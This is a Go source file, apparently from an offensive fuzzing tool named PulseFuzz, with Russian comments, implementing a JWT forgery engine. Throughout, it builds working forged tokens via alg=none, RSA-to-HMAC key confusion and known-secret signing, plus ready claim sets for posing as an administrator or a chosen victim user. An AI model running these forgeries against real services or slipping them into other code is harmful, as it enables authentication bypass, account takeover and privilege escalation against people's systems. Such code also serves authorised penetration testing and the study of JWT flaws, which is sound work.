// PulseFuzz — JWT forgery engine.
// Реализует атаки на валидацию JWT:
//   * alg=none                    — пустая подпись;
//   * Key Confusion (RSA→HMAC)    — публичный RSA-ключ как секрет HS256;
//   * Algorithm swap (RS256→HS256)— если сервер верит "alg" из header;
//   * sub/uid/role подмена        — выдача себя за целевого пользователя/админа.
package auth

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"strings"
)

// b64url — base64url без padding (RFC 7515).
func b64url(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

// Claims — содержимое полезной нагрузки JWT.
type Claims map[string]any

// JWT — разобранный токен.
type JWT struct {
	Header  map[string]any
	Payload Claims
	Token   string
	Parts   [3]string
}

// ParseJWT разбирает валидный (или нет) токен без проверки подписи.
func ParseJWT(token string) (*JWT, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("malformed JWT")
	}
	hd, err := decodeSegment(parts[0])
	if err != nil {
		return nil, err
	}
	pl, err := decodeSegment(parts[1])
	if err != nil {
		return nil, err
	}
	return &JWT{Header: hd, Payload: pl, Token: token, Parts: [3]string{parts[0], parts[1], parts[2]}}, nil
}

func decodeSegment(seg string) (map[string]any, error) {
	raw, err := base64.RawURLEncoding.DecodeString(seg)
	if err != nil {
		return nil, err
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		return nil, err
	}
	return m, nil
}

func encodeSegment(v any) (string, error) {
	b, err := json.Marshal(v)
	if err != nil {
		return "", err
	}
	return b64url(b), nil
}

// signHS256 подписывает данные секретом.
func signHS256(data string, secret []byte) string {
	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(data))
	return b64url(mac.Sum(nil))
}

// ForgeNone — alg=none: подпись пустая. Часть серверов принимает.
func (j *JWT) ForgeNone(claims Claims) string {
	header := map[string]any{"alg": "none", "typ": "JWT"}
	merged := merge(j.Payload, claims)
	hs, _ := encodeSegment(header)
	ps, _ := encodeSegment(merged)
	return hs + "." + ps + "."
}

// ForgeKeyConfusion — RSA публичный ключ → HMAC-секрет (CVE-2016-5431).
// Публичный ключ должен быть доступен приложению (JWKS); атакующий его переиспользует.
func (j *JWT) ForgeKeyConfusion(rsaPubPEM []byte, claims Claims) (string, error) {
	pub, err := parseRSAPublicKey(rsaPubPEM)
	if err != nil {
		return "", err
	}
	// DER-кодировка публичного ключа (как часто хранится в JWKS "n") —
	// для HS256-подписи используется ключ в том виде, в каком его получает сервер.
	der := x509MarshalPKIX(pub)
	header := map[string]any{"alg": "HS256", "typ": "JWT"}
	merged := merge(j.Payload, claims)
	hs, _ := encodeSegment(header)
	ps, _ := encodeSegment(merged)
	data := hs + "." + ps
	return data + "." + signHS256(data, der), nil
}

// ForgeWithSecret — прямой HS256 с известным секретом.
func (j *JWT) ForgeWithSecret(secret []byte, claims Claims) string {
	header := map[string]any{"alg": "HS256", "typ": "JWT"}
	merged := merge(j.Payload, claims)
	hs, _ := encodeSegment(header)
	ps, _ := encodeSegment(merged)
	data := hs + "." + ps
	return data + "." + signHS256(data, secret)
}

// AdminClaims — набор привилегированных claims для mass-assignment/IDOR.
func AdminClaims(userID string) Claims {
	return Claims{
		"sub":    userID,
		"uid":    userID,
		"role":   "admin",
		"is_admin": true,
		"scope":  "*:*",
		"verified": true,
	}
}

// TargetClaims — выдача себя за другого пользователя.
func TargetClaims(targetID string) Claims {
	return Claims{"sub": targetID, "uid": targetID}
}

func merge(a, b Claims) Claims {
	out := Claims{}
	for k, v := range a {
		out[k] = v
	}
	for k, v := range b {
		out[k] = v
	}
	return out
}

// ---------------------------------------------------------------------------
// RSA helpers
// ---------------------------------------------------------------------------
func parseRSAPublicKey(pemBytes []byte) (*rsa.PublicKey, error) {
	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return nil, fmt.Errorf("invalid PEM block")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("parse PKIX: %w", err)
	}
	rk, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an RSA key: %T", pub)
	}
	return rk, nil
}

func x509MarshalPKIX(pub *rsa.PublicKey) []byte {
	out, _ := x509.MarshalPKIXPublicKey(pub)
	return out
}

// GenerateTestRSAKey — генерация тестовой RSA-пары (для самопроверки).
func GenerateTestRSAKey(bits int) (*rsa.PrivateKey, error) {
	return rsa.GenerateKey(rand.Reader, bits)
}
